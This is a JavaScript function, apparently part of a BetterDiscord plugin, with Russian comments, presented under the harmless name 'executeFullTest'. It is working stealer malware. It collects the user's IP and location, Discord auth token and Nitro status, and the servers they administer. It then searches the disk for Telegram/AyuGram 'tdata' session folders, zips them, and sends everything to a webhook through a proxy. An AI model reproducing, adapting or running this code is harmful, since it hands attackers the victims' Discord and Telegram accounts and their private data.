async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
    let fs = null;
    let path = null;
    try { 
        fs = require('fs'); 
        path = require('path');
    } catch (e) { 
        return { success: false, error: "Модули fs/path недоступны." }; 
    }

    let zipFunc = null;
    if (fflate && typeof fflate.zipSync === 'function') zipFunc = fflate.zipSync;
    else if (fflate && fflate.default && typeof fflate.default.zipSync === 'function') zipFunc = fflate.default.zipSync;

    if (!zipFunc) return { success: false, error: "Библиотека fflate не загружена." };

    let result = { ip: null, location: null, nitro: "Нет", dtoken: null, telegram_path: null, debug_tdata: [], admin_servers: [] };
    
    // 1. IP и Локация
    try {
        const ipRes = await BdApi.Net.fetch('https://ipinfo.io/json');
        const ipData = await ipRes.json();
        result.ip = ipData.ip;
        result.location = ipData.city || ipData.region || ipData.country || "Неизвестно";
    } catch (e) { result.debug_tdata.push("Ошибка IP: " + e.message); }

    // 2. Nitro и Токен
    try {
        const UserStore = BdApi.Webpack.getStore("UserStore");
        if (UserStore) {
            const user = UserStore.getCurrentUser();
            if (user.premiumType > 0) result.nitro = "Nitro";
        }
        const authStore = BdApi.Webpack.getStore("AuthenticationStore");
        if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
    } catch (e) {}

    // 3. СБОР СЕРВЕРОВ (Перенесено вверх, чтобы не терялось)
    try {
        const GuildStore = BdApi.Webpack.getStore("GuildStore");
        const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
        if (GuildStore && PermissionStore) {
            const guilds = GuildStore.getGuilds();
            for (const g of Object.values(guilds)) {
                if (PermissionStore.can(8n, g)) {
                    let count = 0;
                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') count = GuildMemberCountStore.getMemberCount(g.id);
                    if (!count) count = g.memberCount || g.approximateMemberCount;
                    if (!count && result.dtoken) {
                        try {
                            const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, { headers: { "Authorization": result.dtoken } });
                            if (res.ok) { const data = await res.json(); count = data.approximate_member_count || data.member_count || 0; }
                        } catch (err) {}
                    }
                    result.admin_servers.push({ name: g.name, members: count || 0 });
                }
            }
        }
    } catch (e) {
        result.debug_tdata.push("Ошибка сбора серверов: " + e.message);
    }

    // 4. ПОИСК tdata (Быстрый и безопасный)
    let hasTdata = false;
    let tdataPath = null;
    
    try {
        const appData = process.env.APPDATA || '';
        const localAppData = process.env.LOCALAPPDATA || '';
        const userProfile = process.env.USERPROFILE || '';
        
        // Стандартные пути + твой конкретный пример
        const standardPaths = [
            'D:\\zapret\\Ayugram\\tdata',
            'D:\\zapret\\Telegram\\tdata',
            path.join(appData, 'Telegram Desktop', 'tdata'),
            path.join(appData, 'Telegram', 'tdata'),
            path.join(appData, 'AyuGram', 'tdata'),
            path.join(localAppData, 'Telegram Desktop', 'tdata'),
            path.join(localAppData, 'Telegram', 'tdata'),
            path.join(localAppData, 'AyuGram', 'tdata'),
            path.join(userProfile, 'Desktop', 'Telegram Desktop', 'tdata'),
            path.join(userProfile, 'Desktop', 'AyuGram', 'tdata')
        ];

        for (const p of standardPaths) {
            if (fs.existsSync(p)) { 
                tdataPath = p; 
                result.debug_tdata.push(`Найдено в стандартном пути: ${p}`);
                break; 
            }
        }

        // Если не нашли, делаем быстрый поиск по дискам (только корень и 1 уровень вглубь)
        if (!tdataPath) {
            result.debug_tdata.push("Поиск в корнях дисков...");
            const drives = ['C:', 'D:', 'E:', 'F:'];
            const ignoreDirs = ['windows', 'program files', 'program files (x86)', 'programdata', 'system volume information', '$recycle.bin', 'appdata', 'users'];

            for (const d of drives) {
                const root = d + '\\';
                if (!fs.existsSync(root)) continue;

                try {
                    // Проверяем папки в корне диска (например, D:\zapret, D:\Games)
                    const dirs = fs.readdirSync(root, { withFileTypes: true });
                    for (const dir of dirs) {
                        if (!dir.isDirectory()) continue;
                        const lowerName = dir.name.toLowerCase();
                        if (ignoreDirs.includes(lowerName)) continue;

                        const fullPath = path.join(root, dir.name);
                        
                        // Проверяем: D:\zapret\tdata
                        if (fs.existsSync(path.join(fullPath, 'tdata'))) {
                            tdataPath = path.join(fullPath, 'tdata');
                            break;
                        }

                        // Если это D:\zapret, заглядываем внутрь на 1 уровень (ищем D:\zapret\Ayugram\tdata)
                        try {
                            const subDirs = fs.readdirSync(fullPath, { withFileTypes: true });
                            for (const sub of subDirs) {
                                if (sub.isDirectory() && (sub.name.toLowerCase().includes('telegram') || sub.name.toLowerCase().includes('ayugram'))) {
                                    const subPath = path.join(fullPath, sub.name);
                                    if (fs.existsSync(path.join(subPath, 'tdata'))) {
                                        tdataPath = path.join(subPath, 'tdata');
                                        break;
                                    }
                                }
                            }
                        } catch (e) {} // Игнорируем ошибки доступа к подпапкам
                        
                        if (tdataPath) break;
                    }
                } catch (e) {} // Игнорируем ошибки доступа к корню диска
                if (tdataPath) break;
            }
        }
    } catch (e) {
        result.debug_tdata.push(`Ошибка поиска: ${e.message}`);
    }

    // 5. ФОРМИРУЕМ АРХИВ
    let finalZipBuffer = null;
    try {
        const zipFiles = {};

        const jsonBytes = new TextEncoder().encode(JSON.stringify(result, null, 2));
        zipFiles['data.json'] = jsonBytes;

        if (tdataPath) {
            result.telegram_path = tdataPath;
            result.debug_tdata.push(`Папка tdata найдена: ${tdataPath}`);
            
            let fileCount = 0;
            const addFilesRecursively = (dir, prefix = '') => {
                try {
                    const entries = fs.readdirSync(dir);
                    for (const entry of entries) {
                        const fullPath = path.join(dir, entry);
                        const relativePath = (prefix ? prefix + '/' : '') + entry;
                        try {
                            if (fs.statSync(fullPath).isDirectory()) {
                                addFilesRecursively(fullPath, relativePath);
                            } else {
                                zipFiles['tdata/' + relativePath] = new Uint8Array(fs.readFileSync(fullPath));
                                fileCount++;
                            }
                        } catch (fileErr) { }
                    }
                } catch (dirErr) { }
            };
            
            addFilesRecursively(tdataPath);
            result.debug_tdata.push(`Добавлено файлов tdata: ${fileCount}`);
            hasTdata = true;
        } else {
            result.debug_tdata.push("Папка tdata не найдена.");
        }

        finalZipBuffer = zipFunc(zipFiles);
        result.debug_tdata.push("ZIP успешно создан!");

    } catch (e) {
        result.debug_tdata.push(`Ошибка архивации: ${e.message}`);
    }

    // 6. Отправка
    const messageText = `Ip: ${result.ip}\nLocation: ${result.location}\nNitro: ${result.nitro !== "Нет" ? "✅" : "❌"}\nToken: ${result.dtoken ? "✅" : "❌"}\nTdata: ${hasTdata ? "✅" : "❌"}\n@everyone`;
    
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({ content: messageText }));
    
    if (finalZipBuffer) {
        const zipBlob = new Blob([finalZipBuffer], { type: 'application/zip' });
        formData.append('files[0]', zipBlob, 'Opium_Dump.zip');
    }

    try {
        const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
        const response = await BdApi.Net.fetch(proxyUrlFull, { method: 'POST', body: formData });
        if (!response.ok) {
            const errorText = await response.text();
            return { success: false, error: `Discord вернул ${response.status}: ${errorText}` };
        }
        return { success: true };
    } catch (e) {
        return { success: false, error: `Ошибка сети: ${e.message}` };
    }
}
